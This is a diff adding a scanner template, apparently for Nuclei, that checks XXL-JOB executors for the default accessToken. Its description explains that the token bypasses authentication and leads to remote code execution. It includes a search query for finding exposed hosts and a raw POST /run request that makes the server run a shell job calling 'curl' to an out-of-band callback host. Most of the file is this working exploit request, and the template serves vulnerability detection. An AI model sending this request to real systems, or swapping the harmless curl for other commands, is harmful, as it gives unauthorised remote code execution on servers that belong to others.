@@ -1,0 +1,54 @@
+id: xxl-job-executor-default-accessToken
+
+info:
+  name: xxl-job-executor-default-accessToken
+  author: aaaademo
+  severity: critical
+  description: |
+      XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。经分析和研判，该漏洞利用难度低，可导致远程代码执行。
+  reference:
+    - https://github.com/charonlight/xxl-jobExploitGUI/releases/tag/v1.0
+    - https://mp.weixin.qq.com/s/WkrhDRNhsWxQgg-MQgC7wQ
+  metadata:
+    max-request: 3
+    fofa-query: "invalid request, HttpMethod not support"
+    hunter-query:
+    verified: true
+  tags: xxl-job
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "ping {{dns}}"
+
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+        Content-Length: 422
+        Content-Type: application/json
+        XXL-JOB-ACCESS-TOKEN: default_token
+        Accept-Encoding: gzip
+
+        {
+          "jobId": 187270,
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 187270,
+          "logDateTime": 116989791110,
+          "glueType": "GLUE_SHELL",
+          "glueSource": "curl {{dns}}",
+          "glueUpdatetime": 116989791110,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
